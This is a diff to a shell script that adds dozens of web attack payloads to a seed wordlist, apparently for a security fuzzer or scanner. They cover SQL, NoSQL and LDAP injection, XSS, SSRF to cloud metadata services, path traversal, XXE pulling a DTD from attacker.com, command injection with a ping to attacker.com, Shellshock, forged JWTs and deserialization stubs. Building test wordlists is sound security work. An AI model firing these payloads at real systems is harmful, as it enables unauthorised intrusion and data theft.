@@ -103,18 +103,55 @@ seed_data() {
     echo "[*] Injecting professional baseline seeds..."
     cat <<EOF >> "${TEMP_DIR}/new_master.txt"
 ' OR 1=1--
-admin' #
+admin' --
+' UNION SELECT NULL,NULL,NULL--
+' OR SLEEP(5)--
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+javascript:alert(1)
 http://169.254.169.254/latest/meta-data/
-../../../../etc/passwd
+http://metadata.google.internal/computeMetadata/v1/
+http://127.0.0.1:80
+/etc/passwd
+../../../../../../etc/passwd
+C:\windows\win.ini
+php://filter/convert.base64-encode/resource=index.php
 {{7*7}}
+${7*7}
+<%= 7*7 %>
+; id;
 \$(whoami)
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
+| ping -c 3 attacker.com
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <r>&xxe;</r>
+<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;
+//google.com
+https://google.com
+/\google.com
 {"\$gt": ""}
-eyjhbgcioijsuzi1nij9.eyjzdwiioijhzg1pbiisimlhdcixntexndk0mziyfq.
+{"\$ne": null}
+admin' || '1'=='1
+*)(cn=*)
+*)(&(uid=admin))
+X-Forwarded-For: 127.0.0.1
+User-Agent: () { :; }; echo; /bin/id
+eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
+eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.
+%0d%0aSet-Cookie:session=hacked
+{__schema{types{name}}}
+query { user { password } }
+Origin: https://attacker.com
+Access-Control-Allow-Origin: *
+O:8:"Exploit":1:{s:4:"data";s:4:"test";}
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcG
 __proto__[test]=test
-wp-config.php
+constructor.prototype.test=test
+169.254.169.254
+aws_access_key_id
+/wp-config.php
+/wp-login.php
+%2e%2e%2f
+%252e%252e%252f
 EOF
 }
 
